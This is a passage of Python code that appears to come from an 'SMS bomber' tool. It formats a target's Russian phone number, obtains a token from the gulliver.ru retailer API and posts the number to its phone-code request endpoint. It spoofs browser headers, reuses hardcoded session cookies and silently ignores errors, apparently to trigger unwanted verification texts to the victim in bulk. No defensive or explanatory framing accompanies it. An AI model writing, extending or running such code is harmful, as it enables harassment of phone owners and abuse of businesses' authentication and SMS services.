                            pass
                        try:
                            num = number
                            num2 = ""
                            num2 += '+'
                            num2 += '7'
                            num2 += ' '
                            num2 += '('
                            num2 += num[1]
                            num2 += num[2]
                            num2 += num[3]
                            num2 += ')'
                            num2 += ' '
                            num2 += num[4]
                            num2 += num[5]
                            num2 += num[6]
                            num2 += '-'
                            num2 += num[7]
                            num2 += num[8]
                            num2 += '-'
                            num2 += num[9]
                            num2 += num[10]
                            header = {
                                'Accept': 'application/json, text/plain, */*',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'Connection': 'keep-alive',
                                'Content-Length': '0',
                                'Cookie': 'gulliver_session=rl0F3dYqXjgiIfKrJVFUZZV8Tga7h0vxd4NwjVRq; _userGUID=0:l5aam2lk:Olq2I2kL70ctHeRmWMm6akBBYytSndMb; mgo_uid=34VopnFJFDkVDmmqZKsa',
                                'DNT': '1',
                                'Host': 'www.gulliver.ru',
                                'Origin': 'https://www.gulliver.ru',
                                'Referer': 'https://www.gulliver.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'Sec-Fetch-Dest': 'empty',
                                'Sec-Fetch-Mode': 'cors',
                                'Sec-Fetch-Site': 'same-origin',
                                'User-Agent': user
                            }
                            r = requests.post('https://www.gulliver.ru/api/authorization/phone/token', headers=header)
                            token0 = json.loads(r.text)
                            token = token0['data']['token']
                            header = {
                                'Accept': 'application/json, text/plain, */*',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                                'Connection': 'keep-alive',
                                'Content-Length': '521',
                                'Content-Type': 'application/json;charset=UTF-8',
                                'Cookie': 'gulliver_session=rl0F3dYqXjgiIfKrJVFUZZV8Tga7h0vxd4NwjVRq; _userGUID=0:l5aam2lk:Olq2I2kL70ctHeRmWMm6akBBYytSndMb; mgo_uid=34VopnFJFDkVDmmqZKsa',
                                'DNT': '1',
                                'Host': 'www.gulliver.ru',
                                'Origin': 'https://www.gulliver.ru',
                                'Referer': 'https://www.gulliver.ru/',
                                'sec-ch-ua': '"Chromium";v="102", "Opera GX";v="88", ";Not A Brand";v="99"',
                                'sec-ch-ua-mobile': '?0',
                                'sec-ch-ua-platform': '"Windows"',
                                'Sec-Fetch-Dest': 'empty',
                                'Sec-Fetch-Mode': 'cors',
                                'Sec-Fetch-Site': 'same-origin',
                                'User-Agent': user
                            }
                            payload = {
                                'phone': num2,
                                'token': token
                            }
                            requests.post('https://www.gulliver.ru/api/authorization/phone/code_request', json=payload,
                                          headers=header)
                        except:
                            pass
                    print(number, "\n")
                    b = True
                    break
                else:
                    b = False
        except Exception as er:
            print("ERROR: ", str(er))
